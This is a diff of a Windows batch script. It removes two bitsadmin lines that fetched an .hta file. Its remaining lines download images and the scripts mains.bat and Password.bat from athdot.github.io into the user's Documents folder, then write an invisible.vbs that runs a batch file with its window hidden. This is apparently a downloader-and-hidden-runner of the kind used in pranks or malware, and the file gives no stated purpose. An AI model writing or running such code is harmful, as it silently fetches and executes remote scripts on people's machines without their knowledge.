@@ -5,7 +5,6 @@ md MASTERFOLDER
 cd "%USERPROFILE%/Documents/"
 md MASTERFOLDER
  echo.>"%USERPROFILE%\Documents\MASTERFOLDER\passcheck.txt"
-bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/htl.hta %USERPROFILE%\Documents\MASTERFOLDER\Start.hta
 bitsadmin.exe /transfer "1" https://athdot.github.io/dwnld/1.jpg %USERPROFILE%\Documents\MASTERFOLDER\1.jpg
 
 bitsadmin.exe /transfer "2" https://athdot.github.io/dwnld/2.jpg %USERPROFILE%\Documents\MASTERFOLDER\2.jpg
@@ -27,7 +26,6 @@ bitsadmin.exe /transfer "9" https://athdot.github.io/dwnld/9.gif %USERPROFILE%\D
 bitsadmin.exe /transfer "10" https://athdot.github.io/dwnld/10.jpg %USERPROFILE%\Documents\MASTERFOLDER\trippymeme.jpg
 bitsadmin.exe /transfer "10" https://athdot.github.io/dwnld/mains.bat %USERPROFILE%\Documents\MASTERFOLDER\mains.bat
 bitsadmin.exe /transfer "10" https://athdot.github.io/dwnld/Password.bat %USERPROFILE%\Documents\MASTERFOLDER\Password.bat
-bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/htl.hta %USERPROFILE%\Documents\MASTERFOLDER\Start.hta
 @echo Set shell = WScript.CreateObject("Wscript.Shell")> invisible.vbs
 @echo shell.Run("C:\Users\%USERNAME%\Documents\invisible.bat"),0,true>> invisible.vbs
 @echo @echo off> invisible.bat
